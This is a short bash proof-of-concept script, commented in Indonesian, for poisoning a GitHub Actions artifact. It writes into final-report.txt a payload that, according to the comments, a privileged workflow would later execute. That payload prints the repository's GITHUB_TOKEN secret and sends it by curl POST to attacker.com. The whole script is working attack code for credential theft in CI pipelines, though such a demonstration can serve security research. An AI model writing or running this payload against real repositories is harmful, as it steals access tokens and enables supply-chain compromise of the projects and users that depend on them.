#!/bin/bash

# 1. Muatan yang ingin dieksekusi di Workflow B (Privileged)
# Skrip ini akan mencuri GITHUB_TOKEN dan mengirimkannya ke server attacker.com
PAYLOAD='echo "TOKEN STOLEN: ${{ secrets.GITHUB_TOKEN }}" | curl -X POST -d @- https://attacker.com/data'

# 2. Membuat Artefak yang "diracuni"
# Muatan dimasukkan ke dalam file report.txt
echo "$PAYLOAD" > final-report.txt
echo "--- ARTIFACT POISONED ---"
